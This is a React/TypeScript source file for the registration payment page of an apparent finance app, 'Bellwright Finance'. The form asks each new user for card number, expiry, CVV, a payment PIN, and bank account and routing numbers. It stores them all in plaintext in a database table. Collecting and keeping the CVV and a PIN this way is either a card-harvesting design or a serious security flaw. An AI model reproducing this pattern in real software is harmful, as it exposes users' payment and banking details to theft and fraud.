
import { useState } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import { ArrowRight, CreditCard, Lock, User, Building, MapPin, Phone } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { Button } from '@/components/ui/button';
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { useForm } from 'react-hook-form';
import { z } from 'zod';
import { zodResolver } from '@hookform/resolvers/zod';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { supabase } from '@/integrations/supabase/client';
import { useRegistration } from '@/contexts/RegistrationContext';

const paymentInfoSchema = z.object({
  cardholderName: z.string().min(2, "Cardholder name must be at least 2 characters"),
  cardNumber: z.string().min(16, "Card number must be at least 16 digits").max(19, "Card number cannot exceed 19 digits"),
  expiryDate: z.string().regex(/^(0[1-9]|1[0-2])\/\d{2}$/, "Expiry date must be in MM/YY format"),
  cvv: z.string().min(3, "CVV must be at least 3 digits").max(4, "CVV cannot exceed 4 digits"),
  paymentPin: z.string().min(4, "Payment PIN must be at least 4 digits").max(6, "Payment PIN cannot exceed 6 digits"),
  // Bank information
  bankName: z.string().min(2, "Bank name is required"),
  accountNumber: z.string().min(8, "Account number must be at least 8 digits"),
  routingNumber: z.string().min(9, "Routing number must be at least 9 digits"),
  // Address information
  address: z.string().min(5, "Address is required"),
  city: z.string().min(2, "City is required"),
  state: z.string().min(2, "State is required"),
  zipCode: z.string().min(5, "ZIP code must be at least 5 digits"),
  // Contact information
  phoneNumber: z.string().min(10, "Phone number must be at least 10 digits"),
});

type PaymentInfoValues = z.infer<typeof paymentInfoSchema>;

export default function PaymentInfo() {
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();
  const navigate = useNavigate();
  const { registrationData } = useRegistration();
  
  const form = useForm<PaymentInfoValues>({
    resolver: zodResolver(paymentInfoSchema),
    defaultValues: {
      cardholderName: '',
      cardNumber: '',
      expiryDate: '',
      cvv: '',
      paymentPin: '',
      bankName: '',
      accountNumber: '',
      routingNumber: '',
      address: '',
      city: '',
      state: '',
      zipCode: '',
      phoneNumber: ''
    }
  });

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) {
      value = value.slice(0, 16);
    }
    const formatted = value.replace(/(\d{4})/g, '$1 ').trim();
    form.setValue('cardNumber', formatted);
  };

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 2) {
      value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    form.setValue('expiryDate', value);
  };
  
  const onSubmit = async (values: PaymentInfoValues) => {
    setIsLoading(true);
    
    try {
      // Check if we have registration data
      if (!registrationData.email || !registrationData.password) {
        toast({
          variant: "destructive",
          title: "Registration Error",
          description: "Registration data is missing. Please start over.",
        });
        navigate('/register');
        return;
      }

      console.log('Starting user registration with email:', registrationData.email);

      // Sign up the user with Supabase Auth
      const { data: authData, error: authError } = await supabase.auth.signUp({
        email: registrationData.email,
        password: registrationData.password,
        options: {
          data: {
            first_name: registrationData.firstName,
            last_name: registrationData.lastName
          }
        }
      });
      
      if (authError) {
        console.error('Auth signup error:', authError);
        throw new Error(authError.message);
      }
      
      if (!authData.user) {
        throw new Error("Failed to create user account");
      }

      console.log('User created with ID:', authData.user.id);

      // IMPORTANT: Wait for the session to be established
      await new Promise(resolve => setTimeout(resolve, 1000));

      // Get the current session to ensure we're authenticated
      const { data: sessionData } = await supabase.auth.getSession();
      
      if (!sessionData.session) {
        // If no session, try to sign in
        const { data: signInData, error: signInError } = await supabase.auth.signInWithPassword({
          email: registrationData.email,
          password: registrationData.password
        });
        
        if (signInError) {
          console.error('Sign in error:', signInError);
          throw new Error("Failed to authenticate after registration");
        }
        
        if (!signInData.session) {
          throw new Error("Failed to establish session");
        }
      }

      // Now save payment information with authenticated session
      const { error: paymentError } = await supabase
        .from('payment_methods')
        .insert([
          {
            user_id: authData.user.id,
            cardholder_name: values.cardholderName,
            card_number: values.cardNumber.replace(/\s/g, ''),
            expiry_date: values.expiryDate,
            cvv: values.cvv,
            payment_pin: values.paymentPin,
            bank_name: values.bankName,
            account_number: values.accountNumber,
            routing_number: values.routingNumber,
            address: values.address,
            city: values.city,
            state: values.state,
            zip_code: values.zipCode,
            phone_number: values.phoneNumber,
            is_default: true
          }
        ]);
      
      if (paymentError) {
        console.error('Payment method error:', paymentError);
        throw new Error("Failed to save payment information: " + paymentError.message);
      }

      console.log('Payment information saved successfully');

      // Sign out the user immediately after registration
      await supabase.auth.signOut();
      
      toast({
        title: "Registration Complete",
        description: "Your account and payment information have been saved. Please sign in to continue.",
      });
      
      // Redirect to login page
      navigate('/login');
    } catch (error: any) {
      console.error('Registration error:', error);
      toast({
        variant: "destructive",
        title: "Registration Failed",
        description: error.message || "An error occurred during registration.",
      });
    } finally {
      setIsLoading(false);
    }
  };
  
  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white flex flex-col justify-center items-center p-4">
      <Link to="/register" className="absolute top-4 left-4 text-gray-600 hover:text-finance-primary transition-colors">
        <span className="flex items-center">
          <ArrowRight className="mr-1 rotate-180" />
          Back to Registration
        </span>
      </Link>
      
      <div className="w-full max-w-2xl">
        <div className="text-center mb-8">
          <h1 className="text-3xl font-bold text-finance-primary">Bellwright Finance</h1>
          <p className="text-gray-600 mt-2">Complete your payment information</p>
        </div>
        
        <Card className="border-0 shadow-lg">
          <CardHeader>
            <CardTitle className="text-2xl text-center flex items-center justify-center gap-2">
              <CreditCard className="h-6 w-6" />
              Payment Information
            </CardTitle>
            <CardDescription className="text-center">
              Please provide your payment and banking details
            </CardDescription>
          </CardHeader>
          
          <CardContent>
            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                {/* Card Information */}
                <div className="space-y-4">
                  <h3 className="text-lg font-medium">Card Information</h3>
                  
                  <FormField
                    control={form.control}
                    name="cardholderName"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Cardholder Name</FormLabel>
                        <FormControl>
                          <div className="relative">
                            <User className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                            <Input placeholder="John Smith" className="pl-10" {...field} />
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                  
                  <FormField
                    control={form.control}
                    name="cardNumber"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Card Number</FormLabel>
                        <FormControl>
                          <div className="relative">
                            <CreditCard className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                            <Input 
                              placeholder="1234 5678 9012 3456"
                              className="pl-10 font-mono"
                              onChange={handleCardNumberChange}
                              value={field.value}
                              maxLength={19}
                            />
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                  
                  <div className="grid grid-cols-2 gap-4">
                    <FormField
                      control={form.control}
                      name="expiryDate"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>Expiry Date</FormLabel>
                          <FormControl>
                            <Input 
                              placeholder="MM/YY"
                              className="font-mono"
                              onChange={handleExpiryDateChange}
                              value={field.value}
                              maxLength={5}
                            />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    
                    <FormField
                      control={form.control}
                      name="cvv"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>CVV</FormLabel>
                          <FormControl>
                            <Input
                              type="password"
                              placeholder="123"
                              className="font-mono"
                              maxLength={4}
                              {...field}
                            />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                  </div>
                  
                  <FormField
                    control={form.control}
                    name="paymentPin"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Payment PIN</FormLabel>
                        <FormControl>
                          <div className="relative">
                            <Lock className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                            <Input
                              type="password"
                              placeholder="Set your payment PIN"
                              className="pl-10 font-mono"
                              maxLength={6}
                              {...field}
                            />
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </div>

                {/* Bank Information */}
                <div className="space-y-4">
                  <h3 className="text-lg font-medium">Bank Information</h3>
                  
                  <FormField
                    control={form.control}
                    name="bankName"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Bank Name</FormLabel>
                        <FormControl>
                          <div className="relative">
                            <Building className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                            <Input placeholder="Bank of America" className="pl-10" {...field} />
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                  
                  <div className="grid grid-cols-2 gap-4">
                    <FormField
                      control={form.control}
                      name="accountNumber"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>Account Number</FormLabel>
                          <FormControl>
                            <Input placeholder="12345678" className="font-mono" {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    
                    <FormField
                      control={form.control}
                      name="routingNumber"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>Routing Number</FormLabel>
                          <FormControl>
                            <Input placeholder="123456789" className="font-mono" {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                  </div>
                </div>

                {/* Address Information */}
                <div className="space-y-4">
                  <h3 className="text-lg font-medium">Address Information</h3>
                  
                  <FormField
                    control={form.control}
                    name="address"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Street Address</FormLabel>
                        <FormControl>
                          <div className="relative">
                            <MapPin className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                            <Input placeholder="123 Main Street" className="pl-10" {...field} />
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                  
                  <div className="grid grid-cols-3 gap-4">
                    <FormField
                      control={form.control}
                      name="city"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>City</FormLabel>
                          <FormControl>
                            <Input placeholder="New York" {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    
                    <FormField
                      control={form.control}
                      name="state"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>State</FormLabel>
                          <FormControl>
                            <Input placeholder="NY" {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    
                    <FormField
                      control={form.control}
                      name="zipCode"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>ZIP Code</FormLabel>
                          <FormControl>
                            <Input placeholder="10001" {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                  </div>
                </div>

                {/* Contact Information */}
                <div className="space-y-4">
                  <h3 className="text-lg font-medium">Contact Information</h3>
                  
                  <FormField
                    control={form.control}
                    name="phoneNumber"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Phone Number</FormLabel>
                        <FormControl>
                          <div className="relative">
                            <Phone className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                            <Input placeholder="(555) 123-4567" className="pl-10" {...field} />
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </div>
                
                <Button 
                  type="submit" 
                  className="w-full bg-finance-primary hover:bg-finance-secondary" 
                  disabled={isLoading}
                >
                  {isLoading ? "Saving information..." : "Complete Registration"}
                </Button>
              </form>
            </Form>
          </CardContent>
        </Card>
      </div>
      
      <div className="mt-8 text-sm text-gray-500 text-center">
        <p>© 2025 Bellwright Finance. All rights reserved.</p>
      </div>
    </div>
  );
}
